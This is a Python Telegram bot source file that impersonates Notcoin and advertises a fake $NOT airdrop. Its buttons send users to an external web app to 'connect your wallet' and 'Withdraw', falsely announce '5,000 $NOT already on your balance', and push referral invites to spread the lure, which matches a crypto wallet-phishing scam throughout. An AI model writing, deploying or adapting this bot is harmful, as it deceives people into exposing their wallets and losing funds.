from typing import Final

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

TOKEN: Final = ""
BOT_USERNAME: Final = "@"

#S
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.message and update.message.from_user:
        user = update.message.from_user
    else:
        user = update.effective_user
    username = user.username if user.username else "User"

    buttons = [
        [
            InlineKeyboardButton(
                text="CLAIM $NOT",
                web_app=WebAppInfo(url="https://santricham.github.io/thebot/"),
            )
        ],
        [
            InlineKeyboardButton(
                text="Claim 5,000 $NOT 🎁", callback_data="success_command"
            )
        ],
        [
            InlineKeyboardButton(
                text="Your referral link 👥", callback_data="referal_command"
            )
        ],
        [
            InlineKeyboardButton(
                text="More about airdrop 💬", callback_data="more_command"
            )
        ],
    ]
#A
    keyboard = InlineKeyboardMarkup(buttons)

    text = f"""
Hi, {username}! This is Notcoin 👋

🏆 100,000,000  WAITING FOR YOU! 🏆

Go to WebApp application, connect your wallet

Got any friends? Get them in the game. That way you'll get even more coins together.

Notcoin is what you want it to be. That's all you need to know.
"""

    await context.bot.send_photo(
        photo="start.png",
        chat_id=update.effective_chat.id,
        caption=text,
        reply_markup=keyboard,
    )

#n
async def send_success_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    buttons = [
        [
            InlineKeyboardButton(
                text="📥 Withdraw to wallet!",
                web_app=WebAppInfo(url="https://santricham.github.io/thebot/"),
            )
        ],
        [InlineKeyboardButton(text="🔙 Back", callback_data="back_command")],
    ]

    keyboard = InlineKeyboardMarkup(buttons)

    text = """
🎉 Success! 5,000 $NOT already on your balance in the bot!
    """

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=text,
        reply_markup=keyboard,
    )

#t
async def send_referal_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.message and update.message.from_user:
        user = update.message.from_user
    else:
        user = update.effective_user
    username = user.username if user.username else "User"#R


    text = f"""
👥 Hi {username}, your referral link:

https://t.me/NotDouble2bot

Send this link to a friend to get $NOT.

For each friend, you get 3,000 $NOT.

For friends with a Telegram Premium subscription, you get 15,000 $NOT.
    """

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=text,
    )


async def send_more_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
#i
    text = """
❤️THANK YOU: We're glad you're with us

It didn't take us long to figure out whether to make an AirDrop for you or not, we knew right away - you deserve it. Your support is tremendous, and this airdrop is only 5% of what we want to do later.

There will be a lot of new things to look forward to with our coin and the TON ecosystem.

🎁Participate in the Airdrop:
To participate in the Airdrop there is only one condition - you just need to hold NOT.
1. Click the “Claim $NOT” button in the welcome message.
2. Connect your wallet on which you are holding NOT.
3. Perform simple tasks and invite your friends, for which you will get extra points and eventually a chance to snatch more NOT!

🏆Distribution of rewards:
We don't have an exact date for the reward distribution yet, but we will announce the date soon!
The amount of NOTs you get will depend on your points, so don't forget to do your tasks and invite your friends.
Coins will be sent at the end of Airdrop to the wallet
our program and get involved.
    """

    await context.bot.send_message(
        chat_id=update.effective_chat.id,#h
        text=text,
    )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "success_command":
        await send_success_message(update, context)
    elif query.data == "referal_command":
        await send_referal_message(update, context)
    elif query.data == "more_command":
        await send_more_message(update, context)
    elif query.data == "back_command":
        await start_command(update, context)


if __name__ == "__main__":
    print("Bot is on ...")
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(button_callback))

    app.run_polling(poll_interval=1)
